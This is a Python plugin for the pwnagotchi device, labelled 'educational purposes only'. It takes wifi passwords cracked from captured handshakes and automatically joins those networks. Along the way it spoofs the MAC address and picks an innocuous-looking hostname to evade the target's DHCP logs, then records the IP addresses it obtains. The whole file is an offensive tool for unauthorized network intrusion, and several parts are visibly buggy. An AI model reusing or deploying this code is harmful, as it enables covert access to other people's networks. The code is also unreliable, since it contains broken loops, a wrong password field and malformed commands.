# Educational-purposes-only performs automatic wifi authentication and internal network recon
# Saves cracked wifi information in wpa_supplicant
# Copied from c-nagy and expanded with forrest's "quick_rides_to_jail"
# Install dependencies: apt update; apt install macchanger

from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts
import pwnagotchi.plugins as plugins
import pwnagotchi
import logging
import os
import subprocess
import requests
import time
from pwnagotchi.ai.reward import RewardFunction


READY = 0
STATUS = ''
NETWORK = ''

class EducationalPurposesOnly(plugins.Plugin):
    __author__ = 'silentree12th'
    __version__ = '1.1.0'
    __license__ = 'GPL3'
    __description__ = 'A plugin to automatically authenticate to known networks and perform internal network recon. Saves wifi informations to wpa_supplicant.'

    def __init__(self):
        self.access_points = ""

    def on_loaded(self):
        logging.info("[woop-woop] loaded")
    
    def display_text(self, text):
        global STATUS
        STATUS = text
    
    def on_ui_update(self, ui):
        global STATUS
        while STATUS == 'rssi_low':
            ui.set('face', '(ﺏ__ﺏ)')
            ui.set('status', 'Signal strength of %s is currently too low to connect ...' % NETWORK)
        while STATUS == 'switching_mon_off':
            ui.set('face', '(-__-)')
            ui.set('face', '(✜‿‿✜)')
            ui.set('status', 'Let\'s spice things up. Pausing monitor mode ...')
        while STATUS == 'scrambling_mac':
            ui.set('face', '(⌐■_■)')
            ui.set('status', 'Scrambling MAC address before connecting to %s ...' % NETWORK)
        while STATUS == 'associating':
            ui.set('status', 'Greeting the AP and asking for an IP via DHCP ...')
            ui.set('face', '(◕‿◕ )')
            ui.set('face', '( ◕‿◕)')
        if STATUS == 'associated':
            ui.set('face', '(ᵔ◡◡ᵔ)')
            ui.set('status', 'PWND!')

    def _connect_to_target_network(self, network_name, channel):
        global STATUS
        global NETWORK
        NETWORK = network_name
        logging.info('[woop-woop] sending command to Bettercap to stop using mon0...')
        STATUS = 'switching_mon_off'
        requests.post('http://127.0.0.1:8081/api/session', data='{"cmd":"wifi.recon off"}', auth=('pwnagotchi', 'pwnagotchi'))
        logging.info('[woop-woop] ensuring all wpa_supplicant processes are terminated...')
        subprocess.Popen('systemctl stop wpa_supplicant; killall wpa_supplicant', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] disabling monitor mode...')
        subprocess.Popen('modprobe --remove brcmfmac; modprobe brcmfmac', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        # Runs this driver reload command again because sometimes it gets stuck the first time:
        subprocess.Popen('modprobe --remove brcmfmac; modprobe brcmfmac', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] randomizing wlan0 MAC address prior to connecting...')
        STATUS = 'scrambling_mac'
        subprocess.Popen('macchanger -A wlan0', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] setting hostname to a ^work dictionary word prior to connecting (for added stealth since their DHCP server will see this name)...')
        subprocess.Popen('hostnamectl set-hostname $(grep "^work" /usr/share/dict/words | grep -v "s$" | sort -u | shuf -n 1))', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(5)
        logging.info('[woop-woop] starting up wlan0 again...')
        subprocess.Popen('ifconfig wlan0 up', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(3)
        # This command runs multiple times because it sometimes doesn't work the first time:
        subprocess.Popen('ifconfig wlan0 up', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] setting wlan0 channel to match the target...')
        STATUS = 'associating'
        subprocess.Popen('iwconfig wlan0 channel %d' % channel, shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        subprocess.Popen('ifconfig wlan0 up', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] writing to wpa_supplicant.conf file...')
        with open('/tmp/wpa_supplicant.conf', 'a') as wpa_supplicant_conf:
            wpa_supplicant_conf.write("ctrl_interface=DIR=/var/run/wpa_supplicant\nupdate_config=1\n\nnetwork={\n\tssid=\"%s\"\n\tpsk=\"%s\"\n}\n" % (network_name, self.options['home-password']))
        logging.info('[woop-woop] starting wpa_supplicant background process...')
        subprocess.Popen('ifconfig wlan0 up', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        subprocess.Popen('wpa_supplicant -u -s -c /tmp/wpa_supplicant.conf -i wlan0 &', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] connecting to wifi...')
        subprocess.Popen('ifconfig wlan0 up', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        subprocess.Popen('wpa_cli -i wlan0 reconfigure', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] trying to get an IP address on the network via DHCP...')
        with open("/home/ips.txt", "a") as output_file:
            subprocess.Popen('dhclient wlan0', shell=True, stdin=None, stdout=output_file, stderr=subprocess.PIPE, executable="/bin/bash")
            output_file.write(network_name)
        subprocess.Popen('dhclient wlan0', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        STATUS = 'associated'
        
    def _restart_monitor_mode(self):
        logging.info('[woop-woop] resuming wifi recon and monitor mode...')
        logging.info('[woop-woop] stopping wpa_supplicant...')
        subprocess.Popen('systemctl stop wpa_supplicant; killall wpa_supplicant', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] reloading brcmfmac driver...')
        subprocess.Popen('modprobe --remove brcmfmac && modprobe brcmfmac', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        logging.info('[woop-woop] randomizing MAC address of wlan0...')
        subprocess.Popen('macchanger -A wlan0', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        time.sleep(10)
        subprocess.Popen('ifconfig wlan0 up', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        logging.info('[woop-woop] starting monitor mode...')
        subprocess.Popen('iw phy "$(iw phy | head -1 | cut -d" " -f2)" interface add mon0 type monitor && ifconfig mon0 up', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        logging.info('[woop-woop] telling Bettercap to resume wifi recon...')
        requests.post('http://127.0.0.1:8081/api/session', data='{"cmd":"wifi.recon on"}', auth=('pwnagotchi', 'pwnagotchi'))
        
    def on_bored(self, agent):
        global STATUS
        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
        pwned_networks = {}
        for line in potfile:
            network = line.split(":")
            pwned_networks[network[0]] = network[1]
        for network in self.access_points:
            if network["hostname"] in pwned_networks:
                signal_strength = network["rssi"]
                channel = network["channel"]
                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
                if signal_strength >= -95:
                    logging.info("[woop-woop] Starting association...")
                    self._connect_to_target_network(network['hostname'], channel)
                else:
                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
                    STATUS = 'rssi_low'
                        
    def on_sad(self, agent):
        global STATUS
        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
        pwned_networks = {}
        for line in potfile:
            network = line.split(":")
            pwned_networks[network[0]] = network[1]
        for network in self.access_points:
            if network["hostname"] in pwned_networks:
                signal_strength = network["rssi"]
                channel = network["channel"]
                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
                if signal_strength >= -95:
                    logging.info("[woop-woop] Starting association...")
                    self._connect_to_target_network(network['hostname'], channel)
                else:
                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
                    STATUS = 'rssi_low'

    def on_sleep(self, agent, t):
        global STATUS
        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
        pwned_networks = {}
        for line in potfile:
            network = line.split(":")
            pwned_networks[network[0]] = network[1]
        for network in self.access_points:
            if network["hostname"] in pwned_networks:
                signal_strength = network["rssi"]
                channel = network["channel"]
                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
                if signal_strength >= -95:
                    logging.info("[woop-woop] Starting association...")
                    self._connect_to_target_network(network['hostname'], channel)
                else:
                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
                    STATUS = 'rssi_low'

    def on_wait(self, agent, t):
        global STATUS
        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
        pwned_networks = {}
        for line in potfile:
            network = line.split(":")
            pwned_networks[network[0]] = network[1]
        for network in self.access_points:
            if network["hostname"] in pwned_networks:
                signal_strength = network["rssi"]
                channel = network["channel"]
                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
                if signal_strength >= -95:
                    logging.info("[woop-woop] Starting association...")
                    self._connect_to_target_network(network['hostname'], channel)
                else:
                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
                    STATUS = 'rssi_low'

        
    def on_wifi_update(self, agent, access_points):
        self.access_points = access_points
        # If not connected to a wireless network and mon0 doesn't exist, run _restart_monitor_mode function
        if "Monitor" not in subprocess.Popen('iwconfig mon0').read():
            self._restart_monitor_mode()
        else:
          pass


def _run(cmd):
    result = subprocess.run(
        cmd,
        shell=True,
        stdin=None,
        stderr=None,
        stdout=subprocess.PIPE,
        executable="/bin/bash",
    )
    return result.stdout.decode("utf-8").strip()
        
